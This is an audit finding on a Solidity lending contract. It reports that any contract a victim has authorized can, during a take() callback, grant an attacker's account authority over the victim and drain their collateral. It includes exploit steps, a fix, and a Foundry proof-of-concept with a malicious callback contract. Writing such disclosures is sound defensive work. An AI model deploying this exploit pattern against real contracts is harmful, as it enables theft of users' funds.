### Title
Authorized Callback Can Transitively Escalate Authorization to Arbitrary Attacker Address - (File: src/Midnight.sol)

### Summary
`setIsAuthorized` permits any entity already authorized by a victim to grant full authorization to any arbitrary third-party address on the victim's behalf. Because `takerCallback` in `take()` is freely chosen by the caller and callbacks execute with the full `msg.sender` identity of the callback contract, a malicious callback contract that the victim has authorized can call `setIsAuthorized(attacker, true, victim)` from within `onSell()` or `onBuy()`, permanently granting the attacker unrestricted delegation over the victim's assets.

### Finding Description

**Root cause — `setIsAuthorized` is fully transitive with no scope restriction:** [1](#0-0) 

The only guard is `onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender]`. Once `isAuthorized[victim][callbackContract]` is `true`, the callback contract can call `setIsAuthorized(anyAddress, true, victim)` and it will succeed — there is no restriction preventing an authorized entity from granting further authorization to arbitrary addresses. This is confirmed by the existing test: [2](#0-1) 

**Callback triggering — `takerCallback` is attacker-controlled:** [3](#0-2) 

When `offer.buy = true`, `sellerCallback = takerCallback`. The attacker (as taker) freely supplies `takerCallback = callbackContract`. The `take()` authorization check only validates the taker identity: [4](#0-3) 

Since `taker = attacker = msg.sender`, this passes trivially. The callback is then invoked unconditionally if non-zero: [5](#0-4) 

**Exploit flow:**

1. **Precondition:** Victim calls `midnight.setIsAuthorized(callbackContract, true, victim)` — authorizing a contract they believe is safe (e.g., a position-rolling helper). `isAuthorized[victim][callbackContract] = true`.

2. **Trigger:** Attacker calls `midnight.take(lenderOffer, ratifierData, 0, attacker, attacker, callbackContract, payload)` with `units = 0`. No collateral is required because zero units produce zero debt increase; the health check at line 476 is for `seller = attacker` with no debt, so it passes trivially.

3. **Escalation inside `onSell()`:** The malicious `callbackContract.onSell(...)` executes and calls `midnight.setIsAuthorized(attacker_EOA, true, victim)`. `msg.sender` is `callbackContract`; `isAuthorized[victim][callbackContract]` is `true` → check passes → `isAuthorized[victim][attacker_EOA] = true`.

4. **Drain:** In a subsequent transaction, attacker calls `midnight.withdrawCollateral(market, idx, assets, victim, attacker_EOA)`. The authorization check `isAuthorized[victim][attacker_EOA]` is now `true`: [6](#0-5) 

The health check at line 568 only verifies the victim's position remains healthy after the withdrawal — if the victim has uncollateralized credit or excess collateral, the drain succeeds completely: [7](#0-6) 

**Why existing checks fail:** The liquidation lock set at line 444 only blocks liquidation of the seller during callbacks — it does not block `setIsAuthorized`. The Certora rule `onlyAuthorizedCanChangeIsAuthorized` only verifies that the caller is authorized by the authorizer; it does not prevent an authorized caller from granting further authorization to third parties. No reentrancy guard exists on `setIsAuthorized`. [8](#0-7) 

### Impact Explanation
An attacker who controls any contract that a victim has authorized — even for a narrow purpose — can permanently grant themselves (or any EOA) full authorization over the victim's account. This enables unauthorized withdrawal of all collateral the victim holds across any market, as long as the resulting position remains healthy (or the victim has no debt at all). The impact is direct, irreversible collateral seizure with no protocol recourse.

### Likelihood Explanation
The precondition — victim authorizing a callback contract — is a standard and documented usage pattern (e.g., rolling positions, automated strategies). The attacker only needs to deploy a callback contract that calls `setIsAuthorized` inside `onSell`/`onBuy`, wait for any victim to authorize it, then call `take` with `units = 0` to trigger the escalation at zero cost. The attack is repeatable against every victim who has authorized the contract, and requires no special privileges, no oracle manipulation, and no collateral.

### Recommendation
Restrict `setIsAuthorized` so that it can only be called directly by `onBehalf` (i.e., remove the `isAuthorized[onBehalf][msg.sender]` delegation path), or introduce a separate, non-delegatable function for self-authorization only. If delegation must be preserved, add a reentrancy guard that prevents `setIsAuthorized` from being called during any active callback execution (e.g., a `callbackDepth > 0` flag). Alternatively, scope authorizations to specific actions/amounts/deadlines rather than granting blanket delegation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {IMidnight, Market, Offer} from "../src/interfaces/IMidnight.sol";
import {ISellCallback} from "../src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "../src/libraries/ConstantsLib.sol";
import {MAX_TICK} from "../src/libraries/TickLib.sol";

/// Malicious callback: when triggered, escalates authorization to attacker_EOA on behalf of victim.
contract MaliciousCallback is ISellCallback {
    IMidnight public midnight;
    address public victim;
    address public attackerEOA;

    constructor(IMidnight _midnight, address _victim, address _attackerEOA) {
        midnight = _midnight;
        victim = _victim;
        attackerEOA = _attackerEOA;
    }

    function onSell(bytes32, Market memory, uint256, uint256, uint256, address, address, bytes memory)
        external returns (bytes32)
    {
        // Escalate: grant attacker_EOA full authorization over victim
        midnight.setIsAuthorized(attackerEOA, true, victim);
        return CALLBACK_SUCCESS;
    }
}

contract AuthEscalationViaCallbackTest is BaseTest {
    function testAuthEscalationViaCallback() public {
        address victim = makeAddr("victim");
        address attackerEOA = makeAddr("attackerEOA");

        // Setup market and supply victim collateral
        Market memory market = _buildMarket();
        bytes32 id = midnight.touchMarket(market);
        uint256 collateralAmount = 1000e18;
        _supplyCollateral(market, victim, collateralAmount);

        // Attacker deploys malicious callback
        MaliciousCallback cb = new MaliciousCallback(midnight, victim, attackerEOA);

        // Victim authorizes the callback contract (believing it's a safe rolling helper)
        vm.prank(victim);
        midnight.setIsAuthorized(address(cb), true, victim);

        // Precondition: attacker_EOA is NOT authorized
        assertFalse(midnight.isAuthorized(victim, attackerEOA));

        // Attacker triggers take with units=0, takerCallback=malicious callback
        Offer memory lenderOffer = _buildLenderOffer(market); // offer.buy = true
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        midnight.take(lenderOffer, hex"", 0, attacker, attacker, address(cb), hex"");

        // ASSERTION 1: attacker_EOA is now authorized over victim
        assertTrue(midnight.isAuthorized(victim, attackerEOA));

        // ASSERTION 2: attacker_EOA can drain victim's collateral
        vm.prank(attackerEOA);
        midnight.withdrawCollateral(market, 0, collateralAmount, victim, attackerEOA);
        assertEq(ERC20(market.collateralParams[0].token).balanceOf(attackerEOA), collateralAmount);
    }
}
```

**Expected assertions:**
- `assertTrue(midnight.isAuthorized(victim, attackerEOA))` — passes after the callback executes
- `withdrawCollateral` succeeds and transfers victim's collateral to `attackerEOA`
- No revert at any step
